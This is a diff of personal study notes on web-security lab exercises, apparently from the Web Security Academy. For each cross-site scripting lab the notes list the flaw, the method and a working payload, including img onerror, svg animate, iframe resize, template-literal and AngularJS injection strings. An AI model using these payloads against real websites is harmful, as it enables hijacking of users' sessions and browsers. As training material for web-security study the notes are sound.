@@ -3,51 +3,64 @@
 	Method: just insert any scriptable tag
 	Payload: <img/src/onerror=alert()>
 
+
 ------> Lab: Stored XSS into HTML context with nothing encoded
 	Flow: Output no HTML-encoded
 	Method: just insert any scriptable tag
 	Payload: <img/src/onerror=alert()>
 
+
 ------> Lab: Reflected XSS into HTML context with most tags and attributes blocked
 	Flow: Allows <body> tag and onresize attribute
 	Method: craft an iframe payload and embed it in your server in a way that the ifrmae payload
-		will request the vulnerable page injecting another payload containing <body> tag and
-		onresize attribute. On loading the vulnerable page on your server, the iframe resizes
-		the vulnerable page to execute the payload on the vulnerable page.
+	will request the vulnerable page injecting another payload containing <body> tag and
+	onresize attribute. On loading the vulnerable page on your server, the iframe resizes
+	the vulnerable page to execute the payload on the vulnerable page.
+
 	Payload: <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
 		 onload=this.style.width='100px'>
+
 
 ------> Lab: Reflected XSS into HTML context with all tags blocked except custom ones
 	Flow: Allows html custom tag and alot of attributes
 	Method: Use your server to host a site that accesses JS from the vulnerable page and 
-		embed your payload in the request to the vulnerable page.
+	embed your payload in the request to the vulnerable page.
+	
 	Payload: <script>
-		location = 'https://0a7100f703afb15f809d1c51002f004b.web-security-academy.net/?							search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
-		</script>
+	location = 'https://0a7100f703afb15f809d1c51002f004b.web-security-academy.net/?							search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+	</script>
+
 
 ------> Lab: Reflected XSS with event handlers and href attributes blocked
 	Flow: forgot to escape svg, animate and a tags
 	Method: craft a payload using <svg>, <animate> and <a> tags in such a way that the <animate> tag assigns
-		attribute and attribute value to <a> tag. The attribute and its value should trigger the xss.
-		Payload: <svg><a><animate attributeName='href' values='javascript:alert(0)'/><text y='25' x='25'>Click me</text></a></svg>
+	attribute and attribute value to <a> tag. The attribute and its value should trigger the xss.
+	
+	Payload: <svg><a><animate attributeName='href' values='javascript:alert(0)'/><text y='25' x='25'>Click me</text></a></svg>
+
 
 ------> Lab: Reflected XSS with some SVG markup allowed
 	Flow: forgot to disallow SVG markup
 	method: brute-force the tags to see all allowed tags.
-		You'll find that <svg> and <animateTransform> tags are allowed.
-		Learn how these two tags work together. 
+	You'll find that <svg> and <animateTransform> tags are allowed.
+	Learn how these two tags work together. 
+
 	Payload: <svg><animateTransform onbegin=alert(0)>
+
 
 ------> Lab: Reflected XSS into attribute with angle brackets HTML-encoded
 	Flow: Forgot to encode double quote (") in output and to filter out attribute names
 	Method: Craft a payload that'll end the existing attribute and create an event handler that'll automatically execute your
-		payload.
+	payload.
+	
 	Payload: "+autofocus+onfocus%3Dalert()+x%3D"
+
 
 ------> Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
 	Flow: forgot and allowed javascript psoudo-protocol
 	Method: craft javascript psoudo-protocol valid payload and inject it in website input field
 	Payload: javascript:alert()
+
 
 ------> Lab: Reflected XSS in canonical link tag
 	Flow: Allowed single quotes (') and some attributes like accesskey and onclick
@@ -60,10 +73,12 @@
 	Method: break out of the existing script tag and construct your own script.
 	Payload: </script><script>alert(0)</script>
 
+
 ------> Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
 	Flow: Allowed aphostrope (') and ;
 	Method: Breakout of the existing stiring and craft your payload
 	Payload: ';alert();//
+
 
 ------> Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes 
 	HTML-encoded and single quotes escaped
@@ -71,28 +86,36 @@
 	Method: escape the escape character returned by the app.
 	Payload: \';alert();//
 
+
 ------> Lab: Reflected XSS in a JavaScript URL with some characters blocked
 	Flow: Forgot to filter out unnecessary user input
 	Method: Craft a JS payload that can be executed without using brackets or angle brackets
 	Payload: 4&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
 
+
 ------> Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes 
 	and backslash escaped
+
 	Flow: Forgot to escape HTML-encoded characters
 	Method: HTML-encode some of the characters in your payload to bypass the escaping function of the application
 	Payload: http://BSH%26apos;);alert(0);//
+
+
+------> Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, 
+	backslash and backticks Unicode-escaped
+
+	Flow: they used template leteral which allows arbitrary javascript code to be executed 
+	in it.
+
+	Method: add executable js code in the template literal
+	Payload: BSH${alert(0)}
+
 
 ------> Lab: Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 	Flow: allows AngularJs codes without proper sanitization
 	Method: injece AngularJs code in the search function
 	Payload: {{$on.constructor('alert(1)')()}}
 
-------> Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, 
-		backslash and backticks Unicode-escaped
-	Flow: they used template leteral which allows arbitrary javascript code to be executed 
-		in it.
-	Method: add executable js code in the template literal
-	Payload: BSH${alert(0)}
 
 
 
